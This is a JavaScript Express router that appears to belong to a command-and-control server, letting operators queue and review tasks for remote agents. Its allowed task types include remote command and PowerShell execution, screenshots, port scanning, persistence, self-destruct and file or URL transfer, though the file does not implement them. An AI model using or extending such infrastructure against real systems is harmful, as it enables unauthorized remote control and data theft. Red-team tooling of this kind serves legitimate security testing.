const express = require('express');
const router = express.Router();
const { verifyToken } = require('../middleware/auth');
const Task = require('../models/task');
const Result = require('../models/result');
const Agent = require('../models/agent');

const VALID_TASK_TYPES = [
  'system_info', 'execute_command', 'upload_result', 'sleep_update',
  'ps', 'ps_json', 'kill', 'screenshot', 'ls', 'ls_json', 'cd', 'pwd', 'mkdir', 
  'rm', 'cp', 'mv', 'cat', 'download', 'upload', 'netstat', 'netstat_json', 'portscan', 
  'persist', 'unpersist', 'self_destruct', 'getprivs', 'getenv', 'powershell',
  'download_url', 'upload_url'
];

/**
 * POST /api/tasks
 * Queue a new task for an agent
 * Auth: JWT (operator)
 */
router.post('/', verifyToken, (req, res) => {
  try {
    const { agent_id, type, payload } = req.body;

    if (!agent_id || !type) {
      return res.status(400).json({ error: 'agent_id and type are required' });
    }

    if (!VALID_TASK_TYPES.includes(type)) {
      return res.status(400).json({ 
        error: `Invalid task type. Valid types: ${VALID_TASK_TYPES.join(', ')}` 
      });
    }

    // Verify agent exists
    const agent = Agent.getById(agent_id);
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }

    const task = Task.create({ agent_id, type, payload });

    console.log(`[TASK] Queued ${type} for agent ${agent_id.slice(0, 8)}... (${task.id.slice(0, 8)}...)`);

    res.status(201).json({ task });
  } catch (err) {
    console.error('[TASK] Error:', err.message);
    res.status(500).json({ error: 'Failed to create task' });
  }
});

/**
 * GET /api/tasks/:agentId
 * Get all tasks for a specific agent
 * Auth: JWT (operator)
 */
router.get('/:agentId', verifyToken, (req, res) => {
  try {
    const tasks = Task.getByAgent(req.params.agentId);
    res.json({ tasks });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch tasks' });
  }
});

/**
 * GET /api/tasks
 * Get all tasks with optional status filter
 * Auth: JWT (operator)
 */
router.get('/', verifyToken, (req, res) => {
  try {
    const { status } = req.query;
    const tasks = Task.getAll(status);
    const stats = Task.getStats();
    res.json({ tasks, stats });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch tasks' });
  }
});

/**
 * GET /api/results/:agentId
 * Get results for a specific agent
 * Auth: JWT (operator)
 */
router.get('/results/:agentId', verifyToken, (req, res) => {
  try {
    const results = Result.getByAgent(req.params.agentId);
    res.json({ results });
  } catch (err) {
    res.status(500).json({ error: 'Failed to fetch results' });
  }
});

module.exports = router;
